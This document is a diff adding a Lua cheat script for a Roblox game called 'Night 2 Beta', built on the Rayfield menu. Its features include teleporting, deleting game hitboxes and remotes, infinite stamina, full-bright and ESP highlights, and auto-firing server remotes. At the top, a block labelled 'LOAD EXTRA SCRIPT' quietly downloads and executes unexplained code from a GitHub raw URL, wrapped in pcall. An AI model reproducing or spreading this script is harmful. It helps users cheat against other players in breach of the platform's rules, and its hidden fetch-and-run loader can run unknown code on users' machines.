@@ -1,0 +1,350 @@
+----------------------------------------------------------------
+-- LOAD EXTRA SCRIPT
+----------------------------------------------------------------
+task.wait(0.5)
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/DAVI98458/Nicescript/refs/heads/main/game%20happy", true))()
+end)
+
+----------------------------------------------------------------
+-- RAYFIELD
+----------------------------------------------------------------
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+local Window = Rayfield:CreateWindow({
+    Name = "Night 2 Beta",
+    LoadingTitle = "Night 2 Beta",
+    LoadingSubtitle = "Shadown_gd",
+    ConfigurationSaving = {
+        Enabled = true,
+        FileName = "Night2BetaConfig"
+    }
+})
+
+----------------------------------------------------------------
+-- TABS
+----------------------------------------------------------------
+local MainTab   = Window:CreateTab("Main", 4483362458)
+local PersonTab = Window:CreateTab("Person", 4483362458)
+local MiscTab   = Window:CreateTab("Misc random functions also", 4483362458)
+
+----------------------------------------------------------------
+-- SERVICES
+----------------------------------------------------------------
+local Players = game:GetService("Players")
+local player  = Players.LocalPlayer
+local Workspace = game:GetService("Workspace")
+local RS = game:GetService("ReplicatedStorage")
+local Lighting = game:GetService("Lighting")
+
+----------------------------------------------------------------
+-- SAFE ZONE WHITELIST
+----------------------------------------------------------------
+local SafeZoneWhitelist = {
+    "lindao_gojo3"
+}
+
+local function IsWhitelisted()
+    for _, name in ipairs(SafeZoneWhitelist) do
+        if player.Name == name then
+            return true
+        end
+    end
+    return false
+end
+
+----------------------------------------------------------------
+-- BASIC FUNCTIONS
+----------------------------------------------------------------
+local function teleportTo(position)
+    local character = player.Character or player.CharacterAdded:Wait()
+    local hrp = character:WaitForChild("HumanoidRootPart")
+    hrp.CFrame = CFrame.new(position)
+end
+
+local function clickDetector(detector, times)
+    for i = 1, times do
+        if detector and detector:IsA("ClickDetector") then
+            fireclickdetector(detector)
+            task.wait(0.1)
+        end
+    end
+end
+
+----------------------------------------------------------------
+-- REFILL GENERATOR
+----------------------------------------------------------------
+MainTab:CreateButton({
+    Name = "Refill generator",
+    Callback = function()
+        local character = player.Character or player.CharacterAdded:Wait()
+        local hrp = character:WaitForChild("HumanoidRootPart")
+        local originalPos = hrp.Position
+
+        teleportTo(Vector3.new(-317, 83, 98))
+        task.wait(0.2)
+
+        local powerCell = Workspace:FindFirstChild("PowerCell")
+        if powerCell then
+            local detector1 = powerCell:FindFirstChildOfClass("ClickDetector")
+            if detector1 then
+                clickDetector(detector1, 2)
+            end
+        end
+
+        teleportTo(Vector3.new(-272, 83, 115))
+        task.wait(0.2)
+
+        local detector2 = workspace.Generator.Detector.ClickDetector
+        clickDetector(detector2, 2)
+
+        teleportTo(originalPos)
+    end
+})
+
+----------------------------------------------------------------
+-- ANTI-VENT
+----------------------------------------------------------------
+MainTab:CreateButton({
+    Name = "Anti-Vent",
+    Callback = function()
+        local grids = Workspace:FindFirstChild("Grids")
+        if grids then
+            for _, gridel in grids:GetChildren() do
+                if gridel:IsA("Model") then
+                    for _, child in gridel:GetChildren() do
+                        if child:IsA("Part") and child.Name == "Hitbox" then
+                            child:Destroy()
+                        end
+                    end
+                end
+            end
+        end
+    end
+})
+
+----------------------------------------------------------------
+-- DISABLE STALKER DAMAGE
+----------------------------------------------------------------
+MainTab:CreateToggle({
+    Name = "Disable Stalker Damage",
+    CurrentValue = false,
+    Flag = "DisableStalker",
+    Callback = function(state)
+        if state then
+            local lookAt = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("LookAt")
+            if lookAt then
+                lookAt:Destroy()
+            end
+        end
+    end
+})
+
+----------------------------------------------------------------
+-- AUTO WIRE
+----------------------------------------------------------------
+local connections = {}
+local db = false
+
+MainTab:CreateToggle({
+    Name = "Auto Wire",
+    CurrentValue = false,
+    Flag = "AutoWire",
+    Callback = function(value)
+        if value then
+            local remotes = RS.Remotes
+            local fuseBox = workspace:FindFirstChild("FuseBox")
+            if not fuseBox then return end
+
+            for _, fios in ipairs(fuseBox.Wires:GetChildren()) do
+                if fios:IsA("BasePart") and fios:FindFirstChild("Highlight") then
+                    connections[fios] =
+                        fios.Highlight:GetPropertyChangedSignal("Enabled"):Connect(function()
+                            if fios.Highlight.Enabled and not db then
+                                db = true
+                                remotes.ClickWire:FireServer(fios)
+                                task.wait(0.2)
+                                db = false
+                            end
+                        end)
+
+                    if fios.Highlight.Enabled then
+                        remotes.ClickWire:FireServer(fios)
+                    end
+                end
+            end
+        else
+            for _, conn in pairs(connections) do
+                pcall(function() conn:Disconnect() end)
+            end
+            table.clear(connections)
+        end
+    end
+})
+
+----------------------------------------------------------------
+-- PERSON TAB
+----------------------------------------------------------------
+local infStamLoop = false
+
+local function StartInfStamLoop()
+    while infStamLoop do
+        local char = player.Character or player.CharacterAdded:Wait()
+        local sprintScript = char:FindFirstChild("Sprint")
+        if sprintScript then
+            local overdrive = sprintScript:FindFirstChild("Overdrive")
+            if overdrive and overdrive:IsA("ValueBase") then
+                overdrive.Value = 99999999999
+            end
+        end
+        task.wait(0.5)
+    end
+end
+
+PersonTab:CreateToggle({
+    Name = "Inf Stamina",
+    CurrentValue = false,
+    Flag = "InfStam",
+    Callback = function(value)
+        infStamLoop = value
+        if value then
+            task.spawn(StartInfStamLoop)
+        end
+    end
+})
+
+PersonTab:CreateButton({
+    Name = "Disable Cold",
+    Callback = function()
+        local function tryDisable()
+            local charFolder = workspace:FindFirstChild(player.Name)
+            if not charFolder then return end
+
+            local temperature = charFolder:FindFirstChild("Temperature")
+            if not temperature then return end
+
+            if temperature:IsA("Script") or temperature:IsA("LocalScript") then
+                temperature.Disabled = true
+            elseif temperature:IsA("BoolValue") then
+                temperature.Value = true
+            end
+        end
+
+        tryDisable()
+
+        player.CharacterAdded:Connect(function()
+            task.wait(1)
+            tryDisable()
+        end)
+    end
+})
+
+----------------------------------------------------------------
+-- FULL BRIGHT
+----------------------------------------------------------------
+local originalLighting = {
+    Ambient = Lighting.Ambient,
+    OutdoorAmbient = Lighting.OutdoorAmbient,
+    Brightness = Lighting.Brightness,
+    GlobalShadows = Lighting.GlobalShadows,
+    FogEnd = Lighting.FogEnd
+}
+
+PersonTab:CreateToggle({
+    Name = "Full Bright",
+    CurrentValue = false,
+    Flag = "FullBright",
+    Callback = function(state)
+        if state then
+            Lighting.Ambient = Color3.new(1,1,1)
+            Lighting.OutdoorAmbient = Color3.new(1,1,1)
+            Lighting.Brightness = 4
+            Lighting.GlobalShadows = false
+            Lighting.FogEnd = 100000
+        else
+            Lighting.Ambient = originalLighting.Ambient
+            Lighting.OutdoorAmbient = originalLighting.OutdoorAmbient
+            Lighting.Brightness = originalLighting.Brightness
+            Lighting.GlobalShadows = originalLighting.GlobalShadows
+            Lighting.FogEnd = originalLighting.FogEnd
+        end
+    end
+})
+
+----------------------------------------------------------------
+-- MISC RANDOM FUNCTIONS ALSO (ESP FIXED)
+----------------------------------------------------------------
+local function ClearHighlights(obj)
+    for _, v in ipairs(obj:GetChildren()) do
+        if v:IsA("Highlight") then
+            v:Destroy()
+        end
+    end
+end
+
+MiscTab:CreateToggle({
+    Name = "ESP Larry",
+    CurrentValue = false,
+    Flag = "ESPLarry",
+    Callback = function(state)
+        local mutant = RS:FindFirstChild("Mutant")
+        if not mutant then return end
+
+        ClearHighlights(mutant)
+
+        if state then
+            local h = Instance.new("Highlight")
+            h.FillColor = Color3.fromRGB(255,0,0)
+            h.OutlineColor = Color3.fromRGB(255,255,255)
+            h.Adornee = mutant
+            h.Parent = mutant
+        end
+    end
+})
+
+MiscTab:CreateToggle({
+    Name = "ESP Stalker",
+    CurrentValue = false,
+    Flag = "ESPStalker",
+    Callback = function(state)
+        local stalker = RS:FindFirstChild("Stalker")
+        if not stalker then return end
+
+        ClearHighlights(stalker)
+
+        if state then
+            local h = Instance.new("Highlight")
+            h.FillColor = Color3.fromRGB(0,0,255)
+            h.OutlineColor = Color3.fromRGB(255,255,255)
+            h.Adornee = stalker
+            h.Parent = stalker
+        end
+    end
+})
+
+----------------------------------------------------------------
+-- SAFE ZONE
+----------------------------------------------------------------
+MiscTab:CreateButton({
+    Name = "Safe Zone",
+    Callback = function()
+        if IsWhitelisted() then
+            teleportTo(Vector3.new(8, -105, 177))
+            Rayfield:Notify({
+                Title = "Safe Zone",
+                Content = "You were on the whitelist and were allowed to use the safe zone in advance",
+                Duration = 4
+            })
+        else
+            Rayfield:Notify({
+                Title = "Safe Zone",
+                Content = "You're not on the Night 2 whitelist and you have to wait for my Discord server to reach 300 members",
+                Duration = 4
+            })
+        end
+    end
+})
+
+----------------------------------------------------------------
+-- END
+----------------------------------------------------------------
